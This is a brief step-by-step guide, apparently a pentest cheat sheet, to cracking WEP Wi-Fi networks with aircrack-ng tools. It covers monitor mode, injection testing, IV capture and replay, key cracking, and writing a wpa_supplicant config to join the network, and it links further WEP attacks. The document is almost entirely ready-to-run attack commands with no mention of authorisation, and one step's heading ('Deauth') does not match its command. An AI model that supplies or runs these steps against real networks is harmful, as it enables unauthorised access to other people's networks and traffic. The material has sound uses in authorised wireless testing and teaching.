Wired Equivalent Privacy is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:


### Step 1: Kill conflicting processes
```bash
sudo airmon-ng check kill
```
### Step 2: Start monitor mode on wlan0
```bash
sudo airmon-ng start wlan0
```
### Step 3: Scan for WEP networks
```bash
sudo airodump-ng wlan0mon --encrypt WEP
```
### Step 3.5: Test if injection works
```bash
sudo aireplay-ng -9 -e ESSID -a SSID wlan0mon
```
### Step 4: Capture IVs
```bash
besside-ng -c Channel -b BSSID wlan0mon
OR
sudo airodump-ng -c 3 --bssid 02:13:37:BE:EF:03 -w wep wlan0mon
```
### Step 4.1: Deauth active users
```bash
sudo aireplay-ng -3 -b BSSID -h CLIENT wlan0mon
```
### Step 5: Crack WEP key
```bash
aircrack-ng ./wep-01.cap
```
### Step 6: Create config
```
network={
	ssid="ESSID"
	scan_ssid=1
	key_mgmt=NONE
	wep_key0="WEPKEY"
}
```
*Note that the key can also be hex. then skip the quotation marks*
### Step 7: connect with Network
```bash
sudo wpa_supplicant -c wpa_supplicant.conf -i wlan0
sudo dhclient wlan0
```
### Additional WEP Attacks:
- [Hirte Attack](https://pentestlab.blog/2015/02/03/hirte-attack/)
- [Caffe Latte Attck](https://www.computerworld.com/article/2539400/cafe-latte-attack-steals-data-from-wi-fi-users.html)

